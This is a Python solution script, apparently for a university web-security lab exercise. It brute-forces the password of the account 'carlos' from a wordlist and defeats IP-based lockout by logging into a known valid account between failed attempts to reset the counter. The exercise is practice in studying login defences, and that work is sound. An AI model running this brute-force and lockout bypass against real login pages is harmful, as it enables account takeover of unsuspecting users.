# for CS 495 - Web and Cloud Security Lab 1.3 - authentication/password-based (2)
'''
For this level, we already know the username of the account we want to hijack: carlos.
We now need to find the matching password via brute-force.
Unfortunately, the site will lock your IP address out if you get your password wrong too many times.
However, we are given the legitimate credentials for another account (wiener:peter).
We can reset the lockout counter that tracks incorrect login attempts if we
successfully log into this account after every incorrect attempt on carlos's account.
The code below logs in using the credentials given:
def login_wiener():
    logindata = {
        'username' : 'wiener',
        'password' : 'peter'
    }
    resp = s.post(login_url, data=logindata)
We can then add this login_wiener call to our prior password brute-forcing code to solve the level.
'''


import requests
# import sys
from bs4 import BeautifulSoup

s = requests.session()

site = "ac8d1f501f0b9fdb8023589f000b00d0.web-security-academy.net"
login_url = f'''https://{site}/login'''

# Not worried about usernames
# username_list = open("Authentication-lab-usernames.txt", "r").readlines()
password_list = open("Authentication-lab-passwords.txt", "r").readlines()

victim_username = 'carlos'
good_credentials = {
    'username': 'wiener',
    'password': 'peter'
}

reset_counter = 1
reset_interval = 2

try:
    for password in password_list:
        target_password = password.strip()
        login_data = {
            'username': victim_username,
            'password': target_password
        }
        resp = s.post(login_url, data=login_data)
        soup = BeautifulSoup(resp.text, 'html.parser')
        if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' in soup.find('p', {'class': 'is-warning'}).text:
            print("You have made too many incorrect login attempts. Please try again in 1 minute(s).")
            break
        if ('Incorrect password' not in soup.find('p', {'class': 'is-warning'}).text) and ('You have made too many incorrect login attempts. Please try again in 1 minute(s).' not in soup.find('p', {'class': 'is-warning'}).text):
            print(f'Password for {victim_username} account is: {target_password}')
            break
        if reset_counter % reset_interval == 0:
            print(f'Resetting server lockout. Counter: {reset_counter}')
            s.post(login_url, data=good_credentials)
        reset_counter = reset_counter + 1
except:
    print(f'Password for {victim_username} account is: {target_password}')


s.get(f'https://{site}/my-account?id={victim_username}')
